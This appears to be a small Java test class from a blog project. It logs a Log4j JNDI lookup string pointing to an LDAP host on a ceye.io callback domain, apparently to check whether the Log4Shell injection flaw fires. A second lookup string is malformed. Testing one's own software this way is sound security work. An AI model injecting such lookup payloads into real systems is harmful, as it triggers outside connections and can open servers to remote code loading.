package marvin.ink.blogboot;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Inject {
    private static final Logger log = LogManager.getLogger(Inject.class);

    public static void main(String[] args) {
        log.error("${jndi:ldap://aa.59ki3h.ceye.io/test}");
        log.error("${jndi: /Applications}");

    }
}
